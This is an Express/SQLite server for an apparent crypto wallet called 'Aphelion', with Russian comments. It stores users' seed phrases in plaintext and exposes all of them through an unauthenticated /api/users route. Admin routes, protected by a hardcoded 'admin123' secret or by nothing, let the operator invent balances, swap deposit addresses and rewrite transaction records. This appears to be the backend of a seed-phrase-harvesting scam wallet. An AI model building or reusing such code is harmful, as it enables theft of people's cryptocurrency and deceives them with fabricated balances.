const express = require('express');
const cors = require('cors');
const sqlite3 = require('sqlite3').verbose();
const bodyParser = require('body-parser');

const app = express();
const PORT = 3001;
const ADMIN_SECRET = 'admin123';

const db = new sqlite3.Database('./aphelion.db');

// Настройка CORS: разрешаем запросы с указанных origin
const allowedOrigins = [
  'http://localhost:3001',
  'http://localhost:5173',
  'https://aphelionwallet.onrender.com',
  'https://aphelionwallet.info',
  'https://www.aphelionwallet.info',
];

app.use(cors({
  origin: allowedOrigins,
  methods: ['GET', 'POST'],
  credentials: true
}));
app.use(bodyParser.json());

// Главная страница (проверка работы сервера)
app.get('/', (req, res) => {
  res.send(`<h2>🚀 Aphelion Server работает</h2><p>Используйте /api/* для работы с API</p>`);
});

// -------------------- Создание таблиц в SQLite --------------------
db.serialize(() => {
  db.run(`CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    mnemonic TEXT UNIQUE,
    receive_address TEXT
  )`);

  db.run(`CREATE TABLE IF NOT EXISTS transactions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    token TEXT,
    amount REAL,
    to_address TEXT,
    status TEXT,
    date TEXT
  )`);

  db.run(`CREATE TABLE IF NOT EXISTS balances (
    user_id INTEGER,
    token TEXT,
    amount REAL,
    receive_address TEXT,
    PRIMARY KEY (user_id, token)
  )`);
});

// -------------------- API-эндпоинты --------------------

// Регистрация пользователя
app.post('/api/register', (req, res) => {
  const { mnemonic } = req.body;
  if (!mnemonic) {
    return res.status(400).json({ error: 'Нет сид-фразы' });
  }
  db.run(`INSERT INTO users (mnemonic) VALUES (?)`, [mnemonic], function (err) {
    if (err) {
      return res.status(400).json({ error: 'Пользователь уже есть' });
    }
    res.json({ id: this.lastID });
  });
});

// Получение пользователя по сид-фразе
app.post('/api/get-user', (req, res) => {
  const { mnemonic } = req.body;
  db.get(`SELECT * FROM users WHERE mnemonic = ?`, [mnemonic], (err, user) => {
    if (err || !user) {
      return res.status(404).json({ error: 'Не найден' });
    }
    res.json(user);
  });
});

// Получение списка пользователей
app.get('/api/users', (req, res) => {
  db.all(`SELECT id, mnemonic, receive_address FROM users ORDER BY id DESC`, (err, rows) => {
    if (err) {
      return res.status(500).json({ error: err.message });
    }
    res.json(rows);
  });
});

// Получение балансов пользователя
app.get('/api/balances/:user_id', (req, res) => {
  const { user_id } = req.params;
  db.all(
    `SELECT token, amount, receive_address FROM balances WHERE user_id = ?`,
    [user_id],
    (err, rows) => {
      if (err) {
        return res.status(500).json({ error: err.message });
      }
      res.json(rows);
    }
  );
});

// Обновление баланса (для пользователя)
app.post('/api/update-balance', (req, res) => {
  const { user_id, token, amount } = req.body;
  db.run(
    `INSERT INTO balances (user_id, token, amount)
     VALUES (?, ?, ?)
     ON CONFLICT(user_id, token) DO UPDATE SET amount = excluded.amount`,
    [user_id, token, amount],
    function (err) {
      if (err) {
        return res.status(500).json({ error: err.message });
      }
      res.json({ success: true });
    }
  );
});

// Обновление баланса (для администратора)
app.post('/api/admin/update-balance', (req, res) => {
  const { user_id, token, amount, secret } = req.body;
  if (secret !== ADMIN_SECRET) {
    return res.status(403).json({ error: 'Нет доступа' });
  }
  db.run(
    `INSERT INTO balances (user_id, token, amount)
     VALUES (?, ?, ?)
     ON CONFLICT(user_id, token) DO UPDATE SET amount = excluded.amount`,
    [user_id, token, amount],
    function (err) {
      if (err) {
        return res.status(500).json({ error: err.message });
      }
      res.json({ success: true });
    }
  );
});

// Удаление баланса (для администратора)
app.post('/api/admin/delete-balance', (req, res) => {
  const { user_id, token } = req.body;
  db.run(`DELETE FROM balances WHERE user_id = ? AND token = ?`, [user_id, token], function (err) {
    if (err) {
      return res.status(500).json({ error: err.message });
    }
    res.json({ success: true });
  });
});

// Обновление receiving address для пользователя (глобально) – админ
app.post('/api/admin/update-receive-address', (req, res) => {
  const { user_id, receive_address, secret } = req.body;
  if (secret !== ADMIN_SECRET) {
    return res.status(403).json({ error: 'Нет доступа' });
  }
  db.run(
    `UPDATE users SET receive_address = ? WHERE id = ?`,
    [receive_address, user_id],
    function (err) {
      if (err) {
        return res.status(500).json({ error: err.message });
      }
      res.json({ success: true });
    }
  );
});

// Обновление receiving address для конкретной монеты (в таблице balances) – админ
app.post('/api/admin/update-balance-address', (req, res) => {
  const { user_id, token, receive_address, secret } = req.body;
  if (secret !== ADMIN_SECRET) {
    return res.status(403).json({ error: 'Unauthorized' });
  }
  db.run(
    `UPDATE balances SET receive_address = ? WHERE user_id = ? AND token = ?`,
    [receive_address, user_id, token],
    function (err) {
      if (err) {
        return res.status(500).json({ error: err.message });
      }
      res.json({ success: true });
    }
  );
});

// Получение транзакций для пользователя
app.get('/api/transactions/:user_id', (req, res) => {
  const { user_id } = req.params;
  db.all(
    `SELECT * FROM transactions WHERE user_id = ? ORDER BY date DESC`,
    [user_id],
    (err, rows) => {
      if (err) {
        return res.status(500).json({ error: err.message });
      }
      res.json(rows);
    }
  );
});

// Создание транзакции
app.post('/api/transaction', (req, res) => {
  const { user_id, token, amount, to_address, status, date: clientDate } = req.body;
  const date = clientDate || new Date().toISOString();
  db.run(
    `INSERT INTO transactions (user_id, token, amount, to_address, status, date)
     VALUES (?, ?, ?, ?, ?, ?)`,
    [user_id, token, amount, to_address, status, date],
    function (err) {
      if (err) {
        return res.status(500).json({ error: err.message });
      }
      res.json({ success: true, id: this.lastID });
    }
  );
});

// Администратор: редактирование транзакции
app.post('/api/admin/update-transaction', (req, res) => {
  const { id, token, amount, to_address, status, date, secret } = req.body;
  if (secret !== ADMIN_SECRET) {
    return res.status(403).json({ error: 'Unauthorized' });
  }
  db.run(
    `UPDATE transactions SET token = ?, amount = ?, to_address = ?, status = ?, date = ? WHERE id = ?`,
    [token, amount, to_address, status, date, id],
    function (err) {
      if (err) {
        return res.status(500).json({ error: err.message });
      }
      res.json({ success: true });
    }
  );
});

// Администратор: удаление транзакции
app.post('/api/admin/delete-transaction', (req, res) => {
  const { id } = req.body;
  db.run(`DELETE FROM transactions WHERE id = ?`, [id], function (err) {
    if (err) {
      return res.status(500).json({ error: err.message });
    }
    res.json({ success: true });
  });
});

// Запуск сервера
app.listen(PORT, () => {
  console.log(`✅ Сервер запущен на http://localhost:${PORT}`);
});
